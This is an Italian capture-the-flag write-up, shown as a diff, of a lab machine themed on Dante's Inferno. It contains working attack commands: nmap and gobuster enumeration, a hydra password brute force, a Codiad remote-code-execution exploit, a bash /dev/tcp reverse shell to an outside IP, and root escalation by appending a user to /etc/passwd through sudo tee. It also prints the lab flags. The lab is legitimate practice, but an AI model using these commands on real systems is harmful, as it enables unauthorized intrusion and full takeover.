@@ -1,0 +1,138 @@
+                                    ---  INFERNO ---
+
+
+   " Nel mezzo del cammin di nostra vita
+mi ritrovai per una selva oscura
+ché la diritta via era smarrita.
+    Ahi quanto a dir qual era è cosa dura
+esta selva selvaggia e aspra e forte
+che nel pensier rinova la paura! "
+
+**nmap <macchina-ip>  
+    Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-28 11:44 CET
+    Nmap scan report for <macchina-ip>  
+    Host is up (0.059s latency).
+    Not shown: 975 closed tcp ports (conn-refused)
+    PORT     STATE SERVICE
+    21/tcp   open  ftp
+    22/tcp   open  ssh
+    25/tcp   open  smtp
+    80/tcp   open  http
+    88/tcp   open  kerberos-sec
+    110/tcp  open  pop3
+    443/tcp  open  https
+    464/tcp  open  kpasswd5
+    636/tcp  open  ldapssl
+    777/tcp  open  multiling-http
+    783/tcp  open  spamassassin
+    808/tcp  open  ccproxy-http
+    1001/tcp open  webpush
+    1236/tcp open  bvcontrol
+    1300/tcp open  h323hostcallsc
+    2000/tcp open  cisco-sccp
+    2003/tcp open  finger
+    2121/tcp open  ccproxy-ftp
+    2602/tcp open  ripd
+    2604/tcp open  ospfd
+    2605/tcp open  bgpd
+    2607/tcp open  connection
+    2608/tcp open  wag-service
+    5051/tcp open  ida-agent
+    5432/tcp open  postgresql
+    
+    Nmap done: 1 IP address (1 host up) scanned in 5.65 seconds
+Possiamo subito notare che abbiamo molte porte aperte.
+Facciamo un ulteriore scansione per verificare quali porte sono effettivamente raggiungibili
+**sudo nmap -sV -sS -sC <macchina-ip>  
+    Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-28 11:45 CET
+    Nmap scan report for <macchina-ip>  
+    Host is up (0.061s latency).
+    Not shown: 977 closed tcp ports (reset)
+    PORT     STATE SERVICE         VERSION
+    22/tcp   open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
+    |   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
+    |_  256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
+    80/tcp   open  http            Apache httpd 2.4.29 ((Ubuntu))
+    |_http-title: Dante's Inferno
+    |_http-server-header: Apache/2.4.29 (Ubuntu)
+come possiamo notare solo la porta 80 e la 22 sono attaccabili.
+Analiziamo ora la pagina Web e ci troviamo d'inanzi a due terzine e ad un immagine dell'inferno dantesco.
+Non trovo nulla d'interessante nella view page source, quindi inizio la scansione con gobuster.
+**gobuster dir --url http:/ <macchina-ip> / --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+    ===============================================================
+    /inferno              (Status: 401) [Size: 459]
+    Progress: 87664 / 87665 (100.00%)
+    ===============================================================
+    Finished
+    ===============================================================
+troviamo solo /inferno che apre un pop up con login e password.
+Non abbiamo altre informazioni, proviamo quindi ad entrare sperando che le credenziali siano super facili.
+**hydra -l root -P /usr/share/wordlists/rockyou.txt <macchina-ip>  http-get /inferno 
+    Non abbiamo risultati positivi
+**hydra -l admin -P /usr/share/wordlists/rockyou.txt <macchina-ip> http-get /inferno 
+    [80][http-get] host: 10.10.131.118   login: admin   password: dante1
+    1 of 1 target successfully completed, 1 valid password found
+Abbiamo cosi trovato le credenziali di accesso: admin & dante1.
+Superato il login del pop up ci indirizza su una pagina dove ancora troviamo un form di login con username e password. 
+Sono gli stessi: admin & dante1.
+Siamo ora su Codiad che sembra esse un framework simile a laravel o wordpress.
+Cerchiamo Codiad su exploit database e abbiamo come risposta 6 exploit diversi, 2 di questi sono verificati.
+Scarico il 49705.py.
+https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit/blob/master/img/linux.gif trovo questo link online che spiega in maniera super chiara come arrivare ad avere la reverse shell, lo riporto anche sotto comunque.
+--python3 Downloads/49705.py http://admin:dante1@<macchina-ip>/inferno/ admin dante1 <nostro-ip> 4444 linux
+--echo 'bash -c "bash -i >/dev/tcp/10.8.251.67/4445 0>&1 2>&1"' | nc -lnvp 4444 
+--nc -lvnp 4445 (qui avremo la reverse shell)
+Ho fatto tutti i passaggi correttamente ma non sono riusciuto ad avere una shell stabile.
+Perdo la connessione ogni 30/40 secondi ed in queste condizioni trovare le informazioni necessarie diventa un impresa.
+Con non poche fatiche riesco a copiarmi un file nascosto che sembra interessante con questo percorso : 
+/home/dante/Downloads/.download.dat
+La stringa di testo trovata all'interno del file è in esadecimale e bisogna decodificarlo per renderlo legibile.
+Una volta decodificata la stringa otteniamo il canto I in cui dante chiede aiuto a virgilio per proseguire il viaggio affrondando con coraggio le sue paure.
+
+
+Â«Or seâ tu quel Virgilio e quella fonte
+che spandi di parlar sÃ¬ largo fiume?Â»,
+rispuosâio lui con vergognosa fronte.
+
+Â«O de li altri poeti onore e lume,
+vagliami âl lungo studio e âl grande amore
+che mâha fatto cercar lo tuo volume.
+
+Tu seâ lo mio maestro e âl mio autore,
+tu seâ solo colui da cuâ io tolsi
+lo bello stilo che mâha fatto onore.
+
+Vedi la bestia per cuâ io mi volsi;
+aiutami da lei, famoso saggio,
+châella mi fa tremar le vene e i polsiÂ».
+
+dante:V1rg1l10h3lpm3
+
+Molto coerentemente con il canto troviamo alla fine quello che sembra essere un username ed una password.
+proviamo quindi ad accedere tramite SSH, l altra porta che avevamo attiva.
+E siamo dentro !!
+subito possiamo acquisire una delle due flag richieste dalla macchina, digitando semplicimente cat local.txt.
+{ 77f6f3c544ec0811e2d1243e2e0d1835 } 
+Non capisco cosa succede ma anche in questo caso perdo la connessione ogni 30 secondi.
+Per ottenere la seconda flag sicuramente dovremo aumentare i nostri privilegi.
+eseguiamo il comando:
+**sudo -l
+(root) NOPASSWD: /usr/bin/tee
+quest'info che abbiamo ottenuto ci dice che possiamo scrivere nei file come etc/passwd con tee senza il bisogno di essere root.
+Senza dubbio è un informazione molto utile che possiamo utilizzare per creare un nuovo utente di cui naturalmente conosciamo la password con privilegi root.
+Il modo più semplice che ho trovato per avere i massimi privilegi in questo caso è il seguente:
+
+**openssl passwd -1 -salt "inferno" "dante"
+
+**printf 'inferno:$1$inferno$vA66L6zp5Qks4kxIc3tvn/:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd
+
+**su - inferno
+    Password: dante
+A questo punto se tutto è andato a buon fine siamo diventati utenti root e possiamo acquisire la seconda flag per completare questa  macchina !!
+**cat proof.txt 
+
+{ f332678ed0d0767d7434b8516a7c6144 }
+
+congratulazioni avete completato la macchina INFERNO!!
